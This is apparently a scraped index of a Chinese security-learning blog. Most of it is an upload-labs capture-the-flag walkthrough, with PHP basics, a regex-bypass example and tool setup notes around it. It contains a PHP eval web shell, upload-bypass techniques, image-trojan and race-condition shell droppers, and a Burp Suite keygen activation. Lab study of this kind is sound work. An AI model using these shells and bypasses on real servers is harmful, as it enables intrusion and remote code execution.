定义类 类名 class hero{ // 声明成员属性 var $name; var $sex; // 声明成员方法 function jineng($var1){ // 使用 $this 调用成员属性 echo $this-\u003ename; echo $var1; } } 3、实例化和赋值 \u003c?php class hero{ var $name; var $sex; function jineng($var1){ echo $this-\u003ename; echo $var1; } } // 实例化类 hero 为 对象 cyj $cyj = new hero(); // 参数赋值 $cyj-\u003ename = \"chengyaojin\"; $cyj-\u003esex = \"man\"; // 调用函数 $cyj-\u003ejineng(\"zuofan\"); // 打印对象 cyj print_r($cyj); 运行结果：\nchengyaojin zuofan hero Object ( [name] =\u003e chengyaojin [sex] =\u003e man ) 4、类的修饰符介绍 在类中直接声明的变量你为成员属性（也可以称为成员变量）。\n可以在类中声明多个变量，即对象中可以有多个成员属性，每个变量都存储了对象不同的属性信息。\n访问权限修饰符：对属性的定义\npublic：公共的，在类的内部、子类和类的外部都可以访问。 protected：受保护的，在类的内部和子类中可以访问，但不能在类的外部访问。 private：私有的，只能在类的内部访问，在类的外部和子类中都不能访问。 访问权限修饰符 类的内部 子类 类的外部 public √ √ √ protected √ √ × private √ × × \u003c?php class hero{ public $name = \"chengyaojin\"; private $sex = \"man\"; protected $shengao = \"165\"; function jineng($var1){ echo $this-\u003ename; echo $var1; } } $cyj = new hero(); echo $cyj-\u003ename; echo $cyj-\u003esex; echo $cyj-\u003eshengao; 运行结果：\nchengyaojin Fatal error: Uncaught Error: Cannot access private property hero::$sex in D:\\Workspace\\php\\new_star_ctf_2024\\md5.php:15 Stack trace: #0 {main} thrown in D:\\Workspace\\php\\new_star_ctf_2024\\md5.php on line 15 \u003c?php class hero{ public $name = \"chengyaojin\"; private $sex = \"man\"; protected $shengao = \"165\"; function jineng($var1){ echo $this-\u003ename; echo $var1; } } class hero2 extends hero{ function test(){ echo $this-\u003ename; echo $this-\u003esex; echo $this-\u003eshengao; } } $cyj = new hero(); $cyj2 = new hero2(); echo $cyj-\u003ename; echo $cyj2-\u003etest(); 运行结果：\nchengyaojinchengyaojin Warning: Undefined property: hero2::$sex in D:\\Workspace\\php\\new_star_ctf_2024\\md5.php on line 16 165 5、类与对象 类是对象的抽象，而对象是类的具体实例 类是想法，把类实例化（new），调用具体值后就变成了对象 6、类的成员方法 在类中定义的函数被称为成员方法 函数实现的是某个独立的功能 成员方法实现的是类中的一个行为，是类的一部分 可以在类中声明多个成员方法，成员方法的声明和函数声明完全一样，只不过在声明成员方法时可以在 function 关键字前加一些访问权限修饰符，如 public、protected、private（可以省略，默认为 public） 四、序列化基础知识 1、序列化的作用 序列化（Serialization） 是将对象的状态信息（属性）转换为可以存储或传输的形式的过程\n对象 —序列化—\u003e 字符串：将对象或数组转化为可存储/传输的字符串\n2、表达方式 \u003c?php $a = null; echo serialize($a); ?\u003e 所有格式第一位都是数据类型的英文字母的简写"},"title":"PHP 反序列化"},"/blog/php/php-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87/":{"data":{"":"","#":"示例一 $cmd = $_POST['cmd']; if (preg_match(\"/cat|flag/i\", $cmd)) { die(\"u can not do this \"); } echo eval($cmd); 代码审计：\n从 HTTP 请求的 POST 方法获取数据，并将名为 cmd 的字段的值赋给变量 $cmd 使用正则表达式匹配 $cmd 中的 cat 和 flag，修饰符 i（case-insensitive）表示不区分大小写 如果匹配成功就终止脚本执行，并输出消息 \"u can not do this \" 如果匹配失败就使用 eval($cmd) 执行 PHP 代码，并输出执行结果 需求：\n查找 flag 文件位置：find / -iname flag 查看 falg 文件内容：cat /flag 解决方法： $(command) 命令替换\n$(...) 是 Shell 中命令替换的语法，它允许在一个命令中执行另一个命令，并将该命令的输出作为结果返回嵌入到其他命令中\nfind / -iname fla$(echo g) ca$(echo t) /fla$(echo g) "},"title":"PHP 正则表达式绕过"},"/blog/python/anaconda-%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/":{"data":{"":"","#":"一、Anaconda 的下载与安装 下载地址：Anaconda\n二、添加到环境变量 Anaconda：\nD:\\Application\\anaconda3 D:\\Application\\anaconda3\\Scripts D:\\Application\\anaconda3\\Library\\bin D:\\Application\\anaconda3\\Library\\mingw-w64\\bin D:\\Application\\anaconda3\\Library\\usr\\bin Miniconda：\nD:\\Application\\miniconda3 D:\\Application\\miniconda3\\Library\\bin D:\\Application\\miniconda3\\Scripts 三、Pycharm 添加解释器 "},"title":"Anaconda 的安装与配置"},"/blog/python/requests/":{"data":{"":"","main-interface#Main Interface":"","request-sessions#Request Sessions":" Note\n官方文档：Requests\nMain Interface 可以通过以下方法访问请求的所有功能，它们都会返回一个 Response 对象\nrequests.request(method, url, **kwargs)：构造并发送请求\n参数：\nmethod：新请求对象的方法（GET、OPTIONS、HEAD、POST、PUT、PATCH 或 DELETE） url：新请求对象的 URL params：(可选）字典，在请求的查询字符串中要发送的元组或字节列表 data：(可选）要在请求正文中发送的字典、元组列表、字节或类文件对象 json：(可选）在请求正文中发送的 JSON 可序列化 Python 对象 headers：(可选）与请求一起发送的 HTTP 请求头信息字典 cookies： (可选）与请求一起发送的 Dict 或 CookieJar 对象 files：(可选）用于多部分编码上传的 'name': file-like-objects（或 {'name': file-tuple}）字典。file-tuple 可以是 2 元组 ('filename'、fileobj)、3 元组 ('filename'、fileobj、'content_type') 或 4 元组 ('filename'、fileobj、'content_type'、custom_headers)，其中content_type是定义给定文件内容类型的字符串，custom_headers 是包含要为文件添加的附加标头的类字典对象 timeout(float or tuple)： (可选）等待服务器发送数据多少秒后放弃，用浮点数或（连接超时、读取超时）元组表示。 Request Sessions class requests.Session（请求会话， 提供 cookie 持久性、连接池和配置）\n1、基础用法\nimport requests session = requests.Session() session.get('https://www.example.com') 2、常用方法\nget(url, **kwargs)：发送 GET 请求，返回 Response 对象\n参数：\nurl：新请求对象的 URL **kwargs：request 接收的可选参数 post(url, data=None, json=None, **kwargs)：发送 POST 请求，返回 Response 对象\n参数：\nurl：新请求对象的 URL data：(可选）要在请求正文中发送的字典、元组列表、字节或类文件对象 json：(可选）在请求正文中发送的 json **kwargs：request 接收的可选参数 patch(url, data=None, **kwargs)：发送 PATCH 请求，返回 Response 对象\n参数：\nurl：新请求对象的 URL data：(可选）要在请求正文中发送的字典、元组列表、字节或类文件对象 **kwargs：request 接收的可选参数 "},"title":"Requests"},"/docs/":{"data":{"":"","-快速入口#🚀 快速入口":"🚀 快速入口 以下是本项目文档的主要部分，您可以直接点击标题跳转到相应章节：\nCisco PT 实验\r渗透测试\rPHP 代码审计\rWeb 架构安全\r红队工具"},"title":"文档"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/":{"data":{"":"这是 渗透测试 部分的概述内容…\nSQL 注入\r环境配置\rXSS\r任意文件上传"},"title":"渗透测试"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/":{"data":{"":"\rupload labs 攻略"},"title":"任意文件上传"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs-%E6%94%BB%E7%95%A5/":{"data":{"":"","pass-01#Pass-01":"","pass-02#Pass-02":"","pass-03#Pass-03":"","pass-04#Pass-04":"","pass-05#Pass-05":"","pass-06#Pass-06":"","pass-07#Pass-07":"","pass-08#Pass-08":"","pass-09#Pass-09":"","pass-10#Pass-10":"","pass-11#Pass-11":"","pass-12#Pass-12":"","pass-13#Pass-13":"","pass-14#Pass-14":"","pass-15#Pass-15":"","pass-16#Pass-16":"","pass-17#Pass-17":"","pass-18#Pass-18":"","pass-19#Pass-19":"","pass-20#Pass-20":"upload-labs 简介 upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场，旨在帮助大家对上传漏洞有一个全面的了解，目前一共 20 关，每一关都包含着不同上传方式。\n注意：\n每一关没有固定的通关方法，大家不要自限思维！\n本项目提供的 writeup 只是起一个参考作用，希望大家可以分享出自己的通关思路。\n实在没有思路时，可以点击查看提示。\n如果黑盒情况下，实在做不出，可以点击查看源码。\n后续:\n如在渗透测试实战中遇到新的上传漏洞类型，会更新到 upload-labs 中。当然如果你也希望参加到这个工作当中，欢迎 pull requests 给我!\n项目地址：https://github.com/c0ny1/upload-labs\nPass-01 尝试上传 fish.php，提示只能上传 .jpg|.png|.gif 类型的文件\n上传文件后抓包失败，考虑是否为客户端 JavaScript 检查，检查页面元素发现 JavaScript 内容\nfunction checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } 1、禁用 JavaScript\n使用扩展 Disable JavaScript 禁用 JavaScript 后直接上传 fish.php\n2、requests 请求模拟\n使用 Python 的 requests 模块进行模拟请求，绕过客户端检查\nimport requests url = \"http://192.168.126.129/upload-labs-0.1/Pass-01/index.php\" files = { 'upload_file': ('fish.php', '\u003c?php @eval($_POST[\\'fish\\']) ?\u003e') } data = { 'submit': '上传' } headers = { 'Referer': 'http://192.168.126.129/upload-labs-0.1/Pass-01/index.php', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0', 'Origin': 'http://192.168.126.129', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', } response = requests.post(url, headers=headers, files=files, data=data) with open('response_text/upload-labs-less01.html', 'w', encoding='utf-8') as f: f.write(response.text) print('Success') 3、劫持请求修改文件后缀\n将 fish.php 的后缀名修改为 .jpg 进行上传，绕过客户端检查后劫持请求，将 filename=fish.jpg 修改为 filename=fish.php\n4、复制 html 到本地修改\n将整个 html 代码复制到本地，删除 javascript 部分的内容，为 form 添加 action 属性（表单提交数据的目标地址），直接提交 fish.php\n\u003cform action=\"http://192.168.126.129/upload-labs-0.1/Pass-01/index.php\" enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"\u003e \u003cp\u003e请选择要上传的图片：\u003c/p\u003e \u003cp\u003e \u003cinput class=\"input_file\" type=\"file\" name=\"upload_file\"\u003e \u003cinput class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"\u003e\u003c/p\u003e \u003c/form\u003e Pass-02 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 提示“文件类型不正确，请重新上传”，判断为 白名单 类型\n尝试 MIME 绕过\nMIME (Multipurpose Internet Mail Extensions) 多用途互联网邮件扩展是一种标准，用来表示文档、文件或一组数据的性质和格式。\n通用结构：type/subtype\n类型 描述 示例 text 普通文本 text/plain, text/html, text/css, text/javascript image 图像 image/gif, image/png, image/jpeg application 二进制数据 application/x-httpd-php, application/octet-stream 上传 fish.php，劫持请求\n将 Content-Type 从 application/octet-stream 修改为 image/jpeg\n上传成功\nPass-03 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n尝试上传特殊可解析后缀\n将 fish.php 的后缀名修改为 .php5 进行上传，上传成功\nWarning\n这里使用蚁剑进行连接出现连接失败，经过多次尝试发现这里需要 php-5.4.45 的环境，并且需要将 Apache 配置文件 httpd-conf 的 403 行 #AddType application/x-httpd-php .php .phtml 修改为 AddType application/x-httpd-php .php .phtml .php1 .php2 .php3 .php4 .php5 .pht，使服务器可以正常将这些后缀名的文件解析为 php。\nPass-04 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n上传特殊可解析后缀 fish.php5 提示“此文件不允许上传”\n尝试上传 .htaccess\n前面 fish.jpg 上传成功，但访问时服务器会将它解析为一个图片，提示“图像因存在错误而无法显示”\n.htaccess 是一个配置文件，用于 Apache 服务器的目录级配置，它允许为特定的目录或文件定义服务器配置，而不需要修改 Apache 的主配置文件。\n新建 .htaccess 文件并添加以下内容，使服务器可以将 fish.jpg 解析为 php 文件\n.htaccess\u003cFilesMatch \"fish.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e 上传 .htaccess\nWarning\n若上传 .htaccess 文件后仍然无法将 fish.jpg 解析为 php 文件，检查 Apache 的配置文件 httpd-conf，修改 AllowOverride 为 All，允许 .htaccess 文件在其目录下进行任意的配置覆盖\nDocumentRoot \"C:\\phpStudy\\WWW\" \u003cDirectory /\u003e Options +Indexes +FollowSymLinks +ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted \u003c/Directory\u003e 访问 fish.jpg 不再提示“图像因存在错误而无法显示”，使用蚁剑成功连接\nPass-05 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n上传特殊可解析后缀 fish.php5 提示“此文件不允许上传”\n上传 .htaccess 提示“此文件类型不允许上传”\n尝试 后缀大小写绕过\n将 fish.php 的后缀名修改为 .PhP 进行上传，上传成功\nPass-06 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n尝试 空格绕过，上传成功\nPass-07 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n尝试 点绕过，上传成功\nPass-08 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n尝试 ::$DATA 绕过，上传成功\n使用蚁剑进行连接\nPass-09 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n尝试 点空格点绕过，上传成功\n使用蚁剑进行连接\nPass-10 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 成功，判断为 黑名单 类型\n尝试 后缀双写，上传成功\n使用蚁剑进行连接\nPass-11 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 失败，判断为 白名单 类型\nWarning\nPHP ≤ 5.3.3 ，php.ini 配置 magic_quotes_gpc = Off\n尝试 %00 截断，上传成功\n使用蚁剑进行连接\nPass-12 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 失败，判断为 白名单 类型\n尝试 0x00 截断 （先使用空格进行占位，再修改为 00），上传成功\n使用蚁剑进行连接\nPass-13 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 失败，判断为 检查内容 类型\n为 fish1.php 添加 文件头\nHex 文件签名 ISO 8859-1 文件扩展名 FF D8 FF DBFF D8 FF E0 00 10 4A 46 49 46 00 01FF D8 FF EEFF D8 FF E1 ?? ?? 45 78 69 66 00 00FF D8 FF E0 ÿØÿÛÿØÿà␀␐JFIF␀␁ÿØÿîÿØÿá??Exif␀␀ÿØÿà jpgjpeg 89 50 4E 47 0D 0A 1A 0A ‰PNG␍␊␚␊ png 47 49 46 38 37 6147 49 46 38 39 61 GIF87aGIF89a gif 1、jpg\n使用 11 进行占位\nfish2.php11\u003c?php @eval($_POST['fish']) ?\u003e 使用 hexedit 替换 11 为 jpg 文件签名 FF D8\n上传 fish2.php 成功，利用任意文件包含漏洞使用蚁剑进行连接\n2、png\n使用 11 进行占位\nfish3.php11\u003c?php @eval($_POST['fish']) ?\u003e 使用 hexedit 替换 11 为 png 文件签名 89 50\n上传 fish3.php 成功，利用任意文件包含漏洞使用蚁剑进行连接\n3、gif\n使用 11 进行占位\nfish4.php11\u003c?php @eval($_POST['fish']) ?\u003e 使用 hexedit 替换 11 为 gif 文件签名 47 49\n上传 fish4.php 成功，利用任意文件包含漏洞使用蚁剑进行连接\nPass-14 排除客户端 JavaScript 检查，上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀 类型\n上传任意后缀文件 fish.fish 失败，判断为 白名单 类型\n尝试 上传图片马\n将 fish1.php 追加到 fish_real.jpg 末尾，生成 fish_trojan.jpg\ncat fish_real.jpg fish1.php \u003e fish_trojan.jpg 查看 fish_trojan.jpg 最后 10 行的数据内容，确认一句话木马被正确追加\n┌──(hailo㉿kali-Hailo)-[~/workspace/upload-labs] └─$ hexdump -C fish_trojan.jpg | tail 0003b200 93 f8 55 c6 b7 8d 49 60 b5 11 c6 7a 51 70 22 c3 |..U...I`...zQp\".| 0003b210 7a d0 0b 8f 53 4e ef 4a 25 6c f4 14 5c 06 ac a7 |z...SN.J%l..\\...| 0003b220 71 06 9e 65 c8 c0 00 52 15 56 ed cd 21 8c 50 01 |q..e...R.V..!.P.| 0003b230 b4 7f 7a 8d 87 d6 8c 6d 14 64 d2 18 bc fa d1 b8 |..z....m.d......| 0003b240 f7 a3 39 a3 14 00 1e 7a 51 83 4a 06 28 ce 29 5c |..9....zQ.J.(.)\\| 0003b250 60 29 43 1a 4a 29 0d 0b b9 8f 1d 28 12 4c 9d 0e |`)C.J).....(.L..| 0003b260 7e b4 6e 34 e0 f4 0c ff d9 3c 3f 70 68 70 20 40 |~.n4.....\u003c?php @| 0003b270 65 76 61 6c 28 24 5f 50 4f 53 54 5b 27 66 69 73 |eval($_POST['fis| 0003b280 68 27 5d 29 20 3f 3e |h']) ?\u003e| 0003b287 上传 fish_trojan.jpg 成功，利用任意文件包含漏洞使用蚁剑进行连接\nPass-15 Warning\n需要开启 php_exif 扩展模块\n上传 fish_trojan.jpg 成功，利用任意文件包含漏洞使用蚁剑进行连接\nPass-16 尝试 二次渲染绕过\n1、gif 绕过\n上传正确的图片 fish_real.gif，将上传后的照片另存为 fish2_real.gif，并使用 010 Editor 比较两张图片\n在未被二次渲染的部分插入一句话木马，另存为 fish2_trojan.gif 后上传成功\n使用蚁剑进行连接\n2、png 绕过\n使用 Python 写了一个用于 png 二次渲染绕过的脚本，项目地址：png_payload\npython png_payload.py --input fish.png --payload \"\u003c?php @eval($_POST['fish']);?\u003e\" --offset 0 可以使用 010 Editor 看到 fish-payload.png 中注入的 payload\n上传成功，但下载上传后的图片发现 payload 不完整\nWarning\n经过测试需要设置一个合适的 PLTE block 偏移量，当 offset 为 0 时 payload 将被注入到 PLTE 头部，可能导致二次渲染后的 payload 不完整。\n将 offset 设置为 30\npython png_payload.py --input fish.png --payload \"\u003c?php @eval($_POST['fish']);?\u003e\" --offset 30 上传成功，下载上传后的图片发现 payload 完整\n使用蚁剑进行连接\n3、jpg 绕过\n参考了一个用于 jpg 二次渲染绕过的 php 脚本并使用 Python 进行了打包，项目地址：jpg_payload\n上传正确的图片 fish_real.jpg，将上传后的照片另存为 fish2_real.jpg，使用 jpg_payload 注入 payload\njpg_payload.exe fish2_real.jpg \"\u003c?php @eval($_POST['fish']);?\u003e\" 可以使用 010 Editor 看到 payload_fish2_real.jpg 中注入的 payload\n上传成功，下载上传后的图片发现 payload 完整\n使用蚁剑进行连接\nWarning\njpg 图片二次渲染绕过不易成功，需要多换几张图片尝试。\nPass-17 利用 条件竞争绕过\n上传 shell.php（用于生成 fish.php）\nshell.php\u003c?php fputs(fopen(\"fish.php\",\"w\"), \"\u003c?php @eval(\\$_POST['fish']);?\u003e\");?\u003e 访问 shell.php\n将 /upload-labs-0.1/Pass-17/index.php 和 /upload-labs-0.1/upload/shell.php 两条记录发送到 Intruder 模块\n设置两条记录 Payload 类型 为 Null payloads，无限重复\n设置两条记录 最大并发请求数 为 25\n开始攻击\n观察到 /upload-labs-0.1/upload/shell.php 攻击时出现 200 状态码时停止攻击\n使用蚁剑连接 fish.php\nPass-18 Warning\n这里的路径拼接有问题，上传一个 jpg 图片应该是 upload/1747315674.jpg，但实际拼出来的是 upload1747315674.jpg，修改 Pass-18/myupload.php 的 $this-\u003ecls_upload_dir = $dir; 为 $this-\u003ecls_upload_dir = $dir.'/';\n利用 Apache 多后缀解析漏洞 + 条件竞争\n上传 shell.php.7z（用于生成 fish.php）\nshell.php.7z\u003c?php fputs(fopen(\"fish.php\",\"w\"), \"\u003c?php @eval(\\$_POST['fish']);?\u003e\");?\u003e 访问 shell.php.7z\n将两条请求发送到 Intruder 模块\n配置条件竞争的 payload\n观察到 /upload-labs-0.1/upload/shell.php.7z 攻击时出现 200 状态码时停止攻击\n使用蚁剑连接 fish.php\nPass-19 尝试 点绕过\n保存名称 fish1.php.，上传成功\n使用蚁剑连接 fish1.php\nPass-20 代码审计\n修改 Content-Type: image/jpeg、save_name[0] 和 save_name[2]\n使用蚁剑连接 fish.php","upload-labs-简介#upload-labs 简介":""},"title":"Upload Labs 攻略"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/":{"data":{"":"这是 环境配置 部分的概述内容…\n靶场部署\r浏览器扩展\rBurp Suite"},"title":"环境配置"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95/":{"data":{"":"","#":"1、HackBar "},"title":"浏览器扩展"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E9%9D%B6%E5%9C%BA%E9%83%A8%E7%BD%B2/":{"data":{"":"","#":"一、sqli-labs 1、安装 phpStudy 根据自己的操作系统下载 32 位 或 64 位版本（一般是 64 位），下载链接：phpStudy\nWarning\n将 phpStudy 安装到 C:\\phpstudy_pro（自定义安装目录时注意路径中不能出现空格）\n2、下载 sqli-labs 使用 git 克隆项目，项目地址：sqli-labs\ngit clone https://github.com/Audi-1/sqli-labs.git sqli-labs 3、配置 sqli-labs 启动 phpStudy 的 Web 服务\n删除 phpStudy 的默认网站\n在 phpStudy 中新建网站\n域名：localhost PHP版本：php5.3.29nts（需要安装） Note\n这里选择 php5.3.29nts 版本是因为 sqli-labs 是一个比较老的项目，使用的部分 php 代码在新版本中可能不支持或已被移除。\n修改数据库 root 密码\n打开 localhost 网站根目录\n在根目录中新建 index.php 文件并添加以下内容（便于后续部署多个靶场）\n\u003c?php header('Content-Type: text/html; charset=utf-8'); // 允许显示的目录 $allowed_dirs = array('sqli-labs'); echo \"\u003ch4\u003e靶场目录\u003c/h4\u003e\"; echo \"\u003cul\u003e\"; foreach($allowed_dirs as $dir) { if(is_dir($dir)) { echo \"\u003cli\u003e\u003ca href='$dir/'\u003e\" . ucfirst($dir) . \"\u003c/a\u003e\u003c/li\u003e\"; } } echo \"\u003c/ul\u003e\"; ?\u003e Note\n$allowed_dirs = array('sqli-labs'); 这里的 'sqli-labs' 是靶场的目录名，可以根据实际情况添加或修改，多个目录名之间使用半角逗号 , 进行分隔。\n将下载的 sqli-labs 复制到网站根目录\n修改 sqli-labs\\sql-connections\\db-creds.inc 数据库连接配置文件\n$dbuser='root'：使用 root 用户\n$dbpass='123456'：修改过后的 root 用户的密码\n使用 IP 地址访问靶场目录中的 sqli-labs\n安装 / 初始化 sqli-labs\n显示如下信息表示安装成功\n使用 sqli-labs 进行 SQL 注入的学习"},"title":"靶场部署"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/burp-suite/":{"data":{"":"","#":"一、Java 环境的配置 Note\nBurp Suite 是一个基于 Java 开发的应用程序，因此需要配置 Java 环境来执行其代码。\n下载链接：Oracle Java\n下载 Windows 版本的 JDK\n将 JDK 的压缩包解压到任意指定的目录（以 D:\\Program Files\\Java 为例）\n配置环境变量\n新建系统变量 JAVA_HOME （以 D:\\Program Files\\Java\\jdk-24 为例）\n编辑系统环境变量 Path，添加 %JAVA_HOME%\\bin\n验证 Java 环境\njava -version 检查 Java 版本 javac -version 检查 Java 编译器版本 二、Burp Suite 的安装 下载链接：Burp Suite\n下载 JAR 版本的 Burp Suite\n下载 BurpLoaderKeygen\nWarning\n由于涉及到版权问题，该软件请在 Github 或 Bing 等网站自行搜索下载，仅供学习和交流使用，商业使用请购买正版软件！\n将下载的 Burp Suite 和 BurpLoaderKeygen 放在任意指定的目录（以 D:\\Program Files\\burpsuite_pro 为例）\n启动 BurpLoaderKeygen 加载器（在 D:\\Program Files\\burpsuite_pro 目录）\njava -jar BurpLoaderKeygen.jar 配置 BurpLoaderKeygen 加载器\n勾选 Auto Run，下次打开 BurpLoaderKeygen 时会自动运行 Burp Suite 任意修改 License Text（可选，以 licensed to Hailo 为例） 复制 License 的内容 点击 Run 运行 Burp Suite 激活 Burp Suite\n点击 Next 跳过 License Agreement\n将之前复制 License 的内容粘贴到 License Key\n选择手动激活 Manual activation\n复制 request\n粘贴到 BurpLoaderKeygen 的 Activation Request 并复制 Activation Response\n粘贴到 Burp Suite 的 response\n成功激活\n优化 Burp Suite 的启动\n新建 burpsuite.bat 文件并放到 Burp Suite 的同级目录下\njava -jar \"D:\\Program Files\\burpsuite_pro\\BurpLoaderKeygen.jar\" 将 D:\\Program Files\\burpsuite_pro 添加到系统环境变量\n在 cmd 中使用 burpsuite 命令运行 Burp Suite\n三、光标偏移错位修复 方法 1： 设置 =\u003e Message editor =\u003e 字体（黑体 16pt）\n方法 2： 设置 =\u003e Display =\u003e 勾选配置缩放设置（缩放比例 1.0）=\u003e 重启 BurpSuite"},"title":"Burp Suite"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-%E6%B3%A8%E5%85%A5/":{"data":{"":"这是 渗透测试 部分的概述内容…\n基本流程\rsqli-labs 攻略"},"title":"SQL 注入"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-%E6%B3%A8%E5%85%A5/sqli-labs-%E6%94%BB%E7%95%A5/":{"data":{"":"","#":"一、Page-1 "},"title":"Sqli Labs 攻略"},"/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xss/":{"data":{"":"这是 渗透测试 部分的概述内容…\nPortSwigger 攻略"},"title":"XSS"},"/docs/%E7%BA%A2%E9%98%9F%E5%B7%A5%E5%85%B7/":{"data":{"":"\rdirsearch\rGitHacker"},"title":"红队工具"},"/docs/%E7%BA%A2%E9%98%9F%E5%B7%A5%E5%85%B7/githacker/":{"data":{"":"","#":"官方仓库：GitHacker\n一、描述 这是一个多线程工具，用于利用 .git 文件夹泄露漏洞，它几乎能够完全下载目标 .git 文件夹，即使目标网站禁用了目录列出功能，该工具也能通过暴力破解常见的 .git 文件来工作。\n通过 GitHacker，您可以查看开发者的提交历史，分支，…，暂存区，这有助于更好地理解目标代码库，甚至发现安全漏洞。\n二、安装 python -m pip install -i https://pypi.org/simple/ GitHacker 三、用法 usage: githacker [-h] (--url URL | --url-file URL_FILE) --output-folder OUTPUT_FOLDER [--brute] [--enable-manually-check-dangerous-git-files] [--threads THREADS] [--delay DELAY] [--version] GitHacker options: -h, --help 显示此帮助信息并退出 --url URL 目标网站的 URL，该网站暴露了 .git 文件夹 --url-file URL_FILE 包含目标网站 URL 列表的文件，这些网站暴露了 `.git` 文件夹 --output-folder OUTPUT_FOLDER 本地文件夹，所有被利用的代码库将存储在该文件夹中，每个代码库将以 md5(url) 命名的文件夹存储 --brute 启用暴力破解分支/标签名称 --enable-manually-check-dangerous-git-files 启用手动检查可能导致远程代码执行（RCE）的危险 Git 文件（例如：.git/config，.git/hook/pre-commit）。如果启用此选项，GitHacker 将不会下载可能危险的文件。 --threads THREADS 下载时使用的线程数 --delay DELAY HTTP 请求之间的延迟时间（单位：秒） --version 显示程序版本号并退出 "},"title":"GitHacker"},"/docs/cisco-pt-%E5%AE%9E%E9%AA%8C/":{"data":{"":"","-快速入口#🚀 快速入口":"🚀 快速入口 以下是本项目文档的主要部分，您可以直接点击标题跳转到相应章节：\nVLAN 基础配置\r跨 VLAN 通信"},"title":"Cisco PT 实验"},"/docs/cisco-pt-%E5%AE%9E%E9%AA%8C/%E8%B7%A8-vlan-%E9%80%9A%E4%BF%A1/":{"data":{"":"","#":"一、使用路由器的两个物理端口 Cisco PT 拓扑图 实验流程 1、配置 PC 的 IP 地址 2、配置路由器端口的 IP 地址 Router\u003een Router#conf t Enter configuration commands, one per line. End with CNTL/Z. Router(config)#int g 0/0/0 Router(config-if)#ip add 192.168.1.254 255.255.255.0 Router(config-if)#no sh Router(config-if)# %LINK-5-CHANGED: Interface GigabitEthernet0/0/0, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0/0, changed state to up Router(config-if)#int g0/0/1 Router(config-if)#ip add 192.168.2.254 255.255.255.0 